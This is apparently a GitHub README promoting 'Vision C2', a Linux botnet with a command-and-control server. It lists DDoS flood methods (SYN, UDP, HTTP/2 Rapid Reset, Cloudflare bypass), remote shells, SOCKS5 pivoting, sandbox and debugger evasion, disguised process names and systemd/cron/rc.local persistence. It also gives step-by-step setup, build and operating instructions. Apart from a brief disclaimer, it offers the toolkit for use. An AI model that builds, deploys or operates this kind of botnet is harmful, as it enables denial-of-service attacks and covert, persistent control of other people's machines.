
<div align="center">

# Vision C2 — The Most Obfuscated Linux Bot to Ever Live

> **14-arch cross-compiled agents. DDoS, RCE, SOCKS5. TLS 1.3 transport + 6-layer C2 address obfuscation + AES-128-CTR runtime decryption. Anti-analysis. Anti-sandbox. Anti-debugger. Full daemon persistence. Zero plaintext in the binary. Driven through a real-time Go TUI that makes your terminal look like a hacker movie.**

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)

[![Architecture](https://img.shields.io/badge/Full_Architecture-Documentation-blueviolet?style=for-the-badge)](Docs/ARCHITECTURE.md)
[![Changelog](https://img.shields.io/badge/Full_ChangeLog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)
<img width="907" height="840" alt="image" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />

</div>

---

## What Makes Vision Different

Most botnets are loud, fragile, and easy to fingerprint. Vision was built from the ground up to be the opposite.

- **Zero plaintext in the binary.** Every sensitive string is AES-128-CTR encrypted at build time and decrypted only at runtime. The encryption key itself is split across 16 individual XOR byte functions scattered throughout the codebase. Static analysis gives you nothing.
- **6-layer C2 address obfuscation.** The server address passes through AES-128-CTR, then a 5-layer decode pipeline: Base64 > XOR rotating key > RC4 stream cipher > byte substitution > MD5 checksum verification. Good luck extracting it.
- **Multi-method DNS resolution.** DoH TXT records (encrypted, bypasses local DNS monitoring) > UDP TXT records > A record fallback > direct IP. If one fails, the next kicks in automatically.
- **Real anti-analysis.** 40+ VM/sandbox/debugger signatures. Parent process debugger detection. If caught, sleeps 24-27 hours (outlasts every sandbox window) then exits cleanly.
- **Full Unix daemonization.** Fork, setsid, fd redirect to /dev/null, signal masking. Survives terminal close, SSH disconnect, everything.
- **Triple-redundant startup.** Systemd service + cron watchdog + rc.local entry. Kill one, the others bring it back.

---

## Key Features

| | Feature | Details |
|---|---|---|
| **Setup** | Auto-Setup | Python script automates config + cross-compilation for 14 architectures |
| **Comms** | TLS 1.3 | Port 443, indistinguishable from standard HTTPS traffic |
| **Proxy** | SOCKS5 | Full pivoting with RFC 1929 auth, runtime credential updates via TUI |
| **Shell** | Remote Exec | Command execution + output capture, Linux shortcuts & post-exploit helpers |
| **Evasion** | Multi-Layer | AES-128-CTR strings, split XOR key derivation, 40+ detection signatures |
| **Stealth** | Daemonized | Fork+setsid, disguised process names, single-instance PID lock |
| **Startup** | Triple | Systemd + cron + rc.local, hidden dir with auto-download script |

---

## Attack Methods

<img width="1183" height="869" alt="image" src="https://github.com/user-attachments/assets/9b08df61-6280-40b2-9baf-a9840ca1887c" />

<details open>
<summary><b>Layer 4 -- Network/Transport</b></summary>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | SYN packets with randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol (47) packets with max payload |
| **DNS Flood** | Randomized DNS query types (DNS reflection, max PPS+) |

</details>

<details open>
<summary><b>Layer 7 -- Application</b></summary>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487) with batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>

---

<img width="1179" height="586" alt="image" src="https://github.com/user-attachments/assets/06f7ca4c-3119-4cd3-81dd-2224d131c290" />

## Installation

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat

# Go 1.23+
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512MB / 1GB | 2GB+ / 5GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

---

### Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for **C2 address**, **admin port** (default: 420), and **TLS cert details**. Output:

```
bins/              -> 14 bot binaries (multi-arch)
cnc/certificates/  -> server.crt + server.key
server             -> CNC binary
setup_config.txt   -> Config summary
```

To change C2 address later: `python3 setup.py` -> option **[2]**. Redeploy bots afterward.

---

### Starting the CNC

```bash
./server              # TUI mode (default, recommended)
./server --split      # Telnet mode on admin port (default: 420)
```

**Split mode connect:** `nc YOUR_IP 420` -> type `spamtec` -> login.

**Background:** `screen -S vision ./server` (detach: `Ctrl+A, D`)

**First run** creates root user with random password -- save it.

---

## TUI Navigation

| Key | Action |
|---|---|
| `Up/Down` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Dashboard Views

- **Bot List** -- Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
- **Remote Shell** -- Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
- **Broadcast Shell** -- Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
- **Launch Attack** -- Select method, target, port, duration -> `l` to launch
- **Ongoing Attacks** -- Progress bars + time remaining. `s`=stop all
- **Socks Manager** -- `s`=start socks (set port + optional user:pass via tab), `x`=stop. Update creds: `!socksauth <user> <pass>`
- **Connection Logs** -- Bot connect/disconnect history

---

### Bot Binaries

| Binary | Architecture | Use Case |
|--------|--------------|----------|
| ethd0 | x86_64 (amd64) | Servers, desktops |
| kworkerd0 | x86 (386) | 32-bit systems |
| ip6addrd | ARM64 | Raspberry Pi 4, phones |
| mdsync1 | ARMv7 | Raspberry Pi 2/3 |
| deferwqd | MIPS | Routers |
| devfreqd0 | MIPSLE | Routers (little-endian) |
| *...and 8 more* | Various | IoT, embedded |

 > [`Build.sh`](tools/build.sh) | Full binary map reference
---

## Architecture

### Two Components

- **`cnc/`** -- Command & Control server. Dual-listener: TLS on port 443 for bot connections, interactive TUI built with Bubble Tea. RBAC with four permission levels (Basic/Pro/Admin/Owner) in `users.json`.

- **`bot/`** -- Agent deployed to targets. Connects back over TLS 1.3. Lifecycle: decode runtime config -> daemonize -> singleton lock -> environment detection -> install startup methods -> DNS-resolve server -> connect with reconnect loop.

### Key Source Files

| File | Purpose |
|------|---------|
| `bot/config.go` | All configuration: raw AES data blobs (`rawServiceAddr`), config seed, sync token, build tag, runtime-decoded string blobs |
| `bot/connection.go` | TLS connection, multi-method DNS resolution chain (DoH -> UDP -> A record -> raw) |
| `bot/attacks.go` | All L4/L7 flood methods |
| `bot/opsec.go` | AES decryption, key derivation, environment detection |
| `bot/persist.go` | Startup via systemd, cron, rc.local |
| `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
| `cnc/ui.go` | Bubble Tea TUI -- all views, keybindings, rendering |
| `cnc/cmd.go` | Command dispatch and routing to bots |
| `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
| `cnc/miscellaneous.go` | RBAC, user authentication, utilities |

---

## Encryption Architecture

- **Server address**: 6-layer encoding pipeline. AES-128-CTR outer layer wrapping 5 inner layers (MD5 checksum -> byte substitution -> RC4 -> XOR rotating key -> base64). The AES blob is decoded at runtime then passes through a 5-step decode pipeline.
- **Runtime strings**: AES-128-CTR with key derived from 16 split XOR byte functions. Built at compile time via `tools/crypto.go`, decoded at runtime by `initRuntimeConfig()`.
- **Transport**: TLS 1.3 with self-signed certificates (generated by `setup.py` in `cnc/certificates/`).

## Documentation

| Document | Description |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history and changes |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`SETUP.md`](Docs/SETUP.md) | Setup guide |

---

## Legal Disclaimer

> **FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY**
>
> **Usage of this tool for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.**

---

## Author

**Syn2Much** -- [dev@sinnners.city](mailto:dev@sinnners.city) | [@synacket](https://x.com/synacket)

---

<div align="center">
<sub>Built different. Maintained by Syn.</sub>
</div>
